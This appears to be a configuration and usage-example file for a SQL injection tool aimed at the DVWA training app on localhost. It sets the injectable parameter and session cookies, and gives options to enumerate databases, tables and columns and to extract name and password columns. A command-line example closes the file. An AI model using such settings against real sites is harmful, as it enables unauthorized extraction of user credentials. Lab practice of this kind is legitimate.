#Here You Can How Simple Use App By Examples:

#argument
method    = "post" #method [get] Or [post]
url       = "http://localhost/dvwa/vulnerabilities/sqli/session-input.php" #Url The Target You want To Inject
data      = {"id":"1","Submit":"Submit"} #Data To Send With  Request
weakkey   = "id"  #This Is Parameter You Want To Inject
urlr      = "http://localhost/dvwa/vulnerabilities/sqli/" #if result show of in onther place in site put url to this place this case happens when injection in session 
headers   =  {}
headers["User-Agent"] = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36(KHTML, like Gecko) Chrome/69.0.3492.0 Safari/537.36"
headers["Cookie"]     = "security=high; PHPSESSID=bdre3jmohs39mck7ofivt3v36t"

#options
option     = "data"               # [databases] Or [tables] Or [columns] Or [data]
database   = "chat"                # database Exammple dvwa
tablename  = "users"               # Table Name Example users
dataex     = "name,password"       # Select One Or More Columns To Extract Data Example user,password


#Examples:
#-----------------------------------------------------------------------------------------------------------
#   to get daatabases just select option database | option = "datbases"                                    #
#-----------------------------------------------------------------------------------------------------------

#-----------------------------------------------------------------------------------------------------------
#   to get tables select database  and option will be tables   |option = "tables" | database = "dvwa"|     #
#-----------------------------------------------------------------------------------------------------------

#-----------------------------------------------------------------------------------------------------------
#   to get columns select database and tablename and option will be                                        #
#   columns |option = "columns" | database = "dvwa"| tablename = "users"                                   #
#-----------------------------------------------------------------------------------------------------------

#-----------------------------------------------------------------------------------------------------------
#   to get data option will be data and select all args |                                                  #
#   option = "data" | database = "dvwa"| tablename = "users"  dataex = "user,password"                     #
#-----------------------------------------------------------------------------------------------------------

#Command Line Example:
#-----------------------------------------------------------------------------------------------------------------------------------------------
# last example to select args from command line                                                                                                 
# scrip.py --method get --url "http://localhost/dvwa/vulnerabilities/sqli/" --data "id=3&Submit=Submit" --weakkey id --option databases -D dvwa --headers "Cookie=security=low; PHPSESSID=792qh9u74u4g8tje0pug9kk32s"                 |
#-----------------------------------------------------------------------------------------------------------------------------------------------

